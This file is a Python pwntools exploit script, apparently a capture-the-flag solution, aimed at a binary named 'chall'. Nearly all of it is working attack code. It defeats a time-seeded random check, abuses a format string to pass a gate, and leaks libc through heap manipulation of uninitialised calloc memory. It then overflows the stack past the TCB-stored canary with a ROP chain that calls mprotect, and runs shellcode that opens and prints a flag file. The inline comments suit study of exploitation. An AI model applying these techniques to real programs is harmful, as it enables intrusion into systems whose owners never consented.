from pwn import *
import ctypes
from ctypes import *
from time import sleep
import sys

context.arch="amd64"
HOST = 'localhost'
PORT = 1111
LIBC = ELF("./libc.so.6",checksec = False)
libc = ctypes.cdll.LoadLibrary("./libc.so.6")
context.noptrace=True
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
else:
    io=process('./chall')

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)


#Defining functions for various heap operations

def add(idx,size,data):
    sla(">> ",'1')
    sla("Index : ",str(idx))
    sla("size : ",str(size))
    sa("details -> \n",data)

def view(idx):
    sla(">> ",'2')
    sla("Candidate: ",str(idx))

def hack(idx):
    sla(">> ",'2020')
    sla("Candidate: ",str(idx))

def free(idx):
    sla(">> ",'3')
    sla("Candidate: ",str(idx))

def move_on():
    sla(">> ",'4')

#Mimicing the random function implemented by binary to break it
def get_rand():
    toc = c_long()
    tic = libc.time(byref(toc))
    while True:
        libc.srand(tic/60)
        lower = 0x1000
        upper = 0xffff
        rand_num = libc.rand()%(upper-lower+1) + lower
        delay = libc.rand()%300 + 1
        end_time = tic + delay
        tic = tic + delay
        libc.srand(end_time/30)
        rand_num_2 = libc.rand()%(upper-lower+1) + lower
        region = rand_num & rand_num_2
        if(region>0x1000):
            return region

if __name__=="__main__":

    region = get_rand()
    log.info("region = " + hex(region))
    #Using format string to pass the initial check , to enter the secret_service
    payload = ('%*18$d' + '%15$n').ljust(16,'a') + p64(region)
    sa("Name: ",payload)
    sla("Age: ","123")
    sleep(1)

    #Add 2 chunks , uneffected by tcache
    add(0,0x600,'b'*0x40)
    add(1,0x80,'a'*0x40)
    #Free first one to send to unsorted bin
    free(0)
    #Send the unsorted bin to large bin
    add(2,0x1260,'unsorted bin')
    #Flip the bit to make the free chunk mapped , which could be used for leaking with calloc
    hack(0)
    hack(0)
    #Now add that chunk to get uninitialised memory from calloc
    add(0,0xd10,'d'*8) #0x10f0
    #view it to leak stuff
    view(0)
    #Leaks
    io.recvuntil("d"*8)
    libc_base = u64(re(6) + '\x00'*2) - 0x1ec1e0
    log.info("libc_base = "+ hex(libc_base))
    #Done with leaks , move on
    move_on()
    gdb.attach(io)
    sla("service?(y/n)\n",'y')
    #Trigger integer overflow with type confusion bug to get large write on stack
    sla("feedback: ",'-1')

    #The shellcode first reopens stdout by mimicing the mechanism of supress_stdout function
    #It does so by calling dup2 , changing file descriptor of stdout back to 1
    #Then we close stdin so that flag gets opened at fd 0.
    #After that , we call openat syscall to open flag at fd 0, as open is not allowed
    #Finally we read flag in memory and write it out
    shellcode = asm('''
            xor rdi,rdi
            mov edi,DWORD PTR [rbp-0x88]
            mov rsi,1
            mov rax,33
            syscall
            mov rax,3
            syscall
            mov rax,3
            mov rdi,0
            xor rsi,rsi
            xor rdx,rdx
            syscall
            mov rax,257
            mov rdi,0xffffff9c
            mov r9,0x67616c66
            push r9
            push rsp
            pop rsi
            mov rdx,0
            mov r10,0644
            syscall
            mov rax,0
            mov rdi,0
            lea rsi,[rsp-0x200]
            mov rdx,0x50
            syscall
            mov rax,1
            mov rdi,1
            syscall
            ''')
    #Gadgets
    mprotect = libc_base + LIBC.symbols['mprotect']
    pop_rdi = libc_base + 0x0000000000026b72
    pop_rsi = libc_base + 0x0000000000027529
    pop_rdx_junk = libc_base + 0x00000000001626d6
    mmap_base = libc_base - 0x5000
    log.info("mmap_base = " + hex(mmap_base))
    shellcode_addr = mmap_base + 0xf20
    fflush = libc_base + LIBC.symbols['fflush']
    stdout = libc_base + LIBC.symbols['_IO_2_1_stdout_']
    rbp = libc_base - 0x4130
    #Adding ROP chain for buffer overflow vuln, the idea is to overwrite TCB structure from where the segment register actually takes canary for checking ,thus overwriting the original canary and triggering overflow
    payload = 'a'*0x80 + p64(rbp)
    payload += p64(pop_rdi)
    payload += p64(mmap_base)
    payload += p64(pop_rsi)
    payload += p64(0x10000)
    payload += p64(pop_rdx_junk)
    payload += p64(7)*2
    #We intend to call mprotect to make mmaped region itself executable
    payload += p64(mprotect)
    payload += p64(shellcode_addr)
    payload += shellcode
    payload += 'a'*(0x8e8 - len(payload))
    log.success('Getting flag')
    sla("feedback: ",payload)
    io.interactive()
